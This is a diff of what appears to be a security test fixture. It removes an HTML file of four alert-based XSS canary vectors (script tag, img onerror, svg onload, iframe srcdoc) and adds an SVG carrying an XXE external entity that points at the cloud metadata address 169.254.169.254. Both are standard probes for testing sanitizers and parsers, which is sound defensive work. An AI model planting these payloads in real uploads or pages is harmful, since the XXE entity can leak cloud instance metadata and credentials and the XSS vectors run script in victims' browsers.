@@ -1,19 +1,7 @@
-<!doctype html>
-<html>
-<head><meta charset="utf-8"><title>xss-canary</title></head>
-<body>
-<h1>HTML XSS canary</h1>
-
-<!-- Vector 1: inline <script> -->
-<script>alert('html-script-canary')</script>
-
-<!-- Vector 2: img onerror (fires even if script tags are stripped) -->
-<img src="x" onerror="alert('html-img-onerror-canary')">
-
-<!-- Vector 3: svg onload nested in HTML -->
-<svg onload="alert('html-svg-onload-canary')"></svg>
-
-<!-- Vector 4: body-less event via iframe srcdoc -->
-<iframe srcdoc="&lt;script&gt;alert('html-iframe-srcdoc-canary')&lt;/script&gt;"></iframe>
-</body>
-</html>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&ssrf;</text>
+</svg>
